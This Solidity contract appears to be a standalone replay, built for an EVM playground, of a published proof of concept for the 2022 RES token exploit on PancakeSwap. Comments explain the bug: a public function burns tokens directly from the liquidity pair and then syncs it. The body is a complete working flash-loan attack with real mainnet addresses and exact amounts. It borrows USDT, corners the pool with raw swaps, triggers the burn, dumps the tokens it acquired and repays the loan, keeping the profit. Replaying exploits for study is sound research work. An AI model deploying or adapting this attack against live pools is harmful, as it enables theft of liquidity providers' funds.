// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-10-RES).
// The DeFiHackLabs PoC (2022-10-RES_exp/test/RES_exp.sol) runs the attack INLINE in
// the Foundry test contract — the PancakeSwap flash-swap callback `pancakeCall` lives
// on the test itself, so there is no standalone contract to deploy. This contract is a
// faithful, self-contained copy of that inline attack (testExploit + pancakeCall +
// stringsEquals), so the playground can deploy it and record attack(). Logic and
// constants are copied verbatim from test/RES_exp.sol.
//
// Root cause: RES (BEP20TokenA)'s public `thisAToB()` → `_thisAToB()` sells the token
// contract's accumulated tax RES into the RES/USDT pair via the router, THEN burns
// that same amount of RES directly out of the pair and calls `pair.sync()`. The
// `_burn(pair, …)` deletes RES from the pair's balance WITHOUT removing any USDT, and
// `sync()` makes the pair accept the shrunken RES reserve — breaking `x·y = k` in favour
// of whoever holds RES. Combined with raw `pair.swap()` buys that bypass the token's
// fee path (loading the contract's tax balance), the attacker corners the pool, trips
// the public sweep, then dumps cheaply-acquired RES into the now-degenerate pool.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IRES is IERC20 {
    function thisAToB() external;
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IPancakePair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112, uint112, uint32);
}

interface IUSDT is IERC20 {}

contract RESBurnFromPool {
    IUSDT constant USDT_TOKEN = IUSDT(0x55d398326f99059fF775485246999027B3197955);
    IERC20 constant ALL_TOKEN = IERC20(0x04C0f31C0f59496cf195d2d7F1dA908152722DE7);
    IPancakeRouter constant PS_ROUTER = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IPancakePair constant USDT_WBNB_PAIR = IPancakePair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
    IPancakePair constant USDT_RES_PAIR = IPancakePair(0x05ba2c512788bd95cd6D61D3109c53a14b01c82A);
    IPancakePair constant USDT_ALL_PAIR = IPancakePair(0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb);
    IRES constant RES_TOKEN = IRES(0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21);

    // the user address that the 6 raw buys send RES to (and that the attack pulls RES
    // and ALL back from via approve+transferFrom). Hardcoded in the original test.
    address constant BUYER = 0x3F693Effc53908d517F186A20431f756C90c2229;

    function attack() external {
        // Flash-borrow 10,014,120.886 USDT from the USDT/WBNB pair. The callback below
        // does the corner → thisAToB → dump → repay sequence, leaving the profit here.
        USDT_WBNB_PAIR.swap(10_014_120_886_666_860_414_836_616, 0, address(this), "borrowusdt");
    }

    function pancakeCall(address, uint256 amount0, uint256, bytes calldata data) external {
        require(msg.sender == address(USDT_WBNB_PAIR), "only flash pair");
        if (!stringsEquals(data, "borrowusdt")) return;

        USDT_TOKEN.approve(address(PS_ROUTER), type(uint256).max);

        // ---- 6 raw pair.swap() buys: transfer USDT in, swap out RES to the BUYER.
        // Bypasses the token's fee/anti-bot path; the tax that accrues lands in the
        // token contract's own balance and becomes the `burnNumber` weaponised below.
        USDT_TOKEN.transfer(address(USDT_RES_PAIR), 476_862_899_365_088_591_182_696);
        USDT_RES_PAIR.swap(0, 71_519_292_481_906, BUYER, "");

        USDT_TOKEN.transfer(address(USDT_RES_PAIR), 953_725_798_730_177_182_365_392);
        USDT_RES_PAIR.swap(0, 22_030_478_307_020, BUYER, "");

        USDT_TOKEN.transfer(address(USDT_RES_PAIR), 1_430_588_698_095_265_773_548_088);
        USDT_RES_PAIR.swap(0, 7_810_673_572_823, BUYER, "");

        USDT_TOKEN.transfer(address(USDT_RES_PAIR), 1_907_451_597_460_354_364_730_784);
        USDT_RES_PAIR.swap(0, 3_504_534_400_905, BUYER, "");

        USDT_TOKEN.transfer(address(USDT_RES_PAIR), 2_384_314_496_825_442_955_913_480);
        USDT_RES_PAIR.swap(0, 1_845_944_923_363, BUYER, "");

        USDT_TOKEN.transfer(address(USDT_RES_PAIR), 2_861_177_396_190_531_547_096_176);
        USDT_RES_PAIR.swap(0, 1_084_945_873_965, BUYER, "");

        // ---- Trip the public sweep. _thisAToB() sells the contract's tax RES into the
        // pair (RES→USDT→ALL), THEN _burn(pair, burnNumber) + sync() — the bug: the RES
        // reserve is slashed without removing any USDT, breaking the AMM invariant.
        RES_TOKEN.thisAToB();

        // The BUYER now holds the cheaply-acquired RES (bought pre-burn) plus the ALL
        // routed there by the buy-fee distribution during the 6 corner buys. The
        // original Foundry test used vm.prank(BUYER) to grant this contract infinite
        // approvals on RES and ALL; the config's `setup` reproduces those pranked
        // approvals before the recorded attack() (caller = BUYER → approve(exploit,…)).
        uint256 resBalance = RES_TOKEN.balanceOf(BUYER);
        uint256 allBalance = ALL_TOKEN.balanceOf(BUYER);

        ALL_TOKEN.transferFrom(BUYER, address(USDT_ALL_PAIR), allBalance);

        (uint256 reserve0, uint256 reserve1,) = USDT_ALL_PAIR.getReserves();
        uint256 getValue = (allBalance * reserve1) / (allBalance + reserve0);
        uint256 getUsdAmount = getValue - ((getValue * 10) / 10_000);
        USDT_ALL_PAIR.swap(0, getUsdAmount, address(this), "");

        // Dump the cheap RES into the now-degenerate RES/USDT pool, pulling out USDT.
        RES_TOKEN.transferFrom(BUYER, address(USDT_RES_PAIR), resBalance);
        USDT_RES_PAIR.swap(1_905_851_854_454_828_201_052_166, 0, address(this), "");

        // Repay the flash loan (principal + 0.251% fee). Profit stays in this contract.
        uint256 refund = amount0 + ((amount0 * 251) / 100_000);
        USDT_TOKEN.transfer(address(USDT_WBNB_PAIR), refund);
    }

    function stringsEquals(bytes calldata s1, string memory s2) private pure returns (bool) {
        bytes memory b1 = bytes(s1);
        bytes memory b2 = bytes(s2);
        uint256 l1 = b1.length;
        if (l1 != b2.length) return false;
        for (uint256 i = 0; i < l1; i++) {
            if (b1[i] != b2[i]) return false;
        }
        return true;
    }

    receive() external payable {}
}
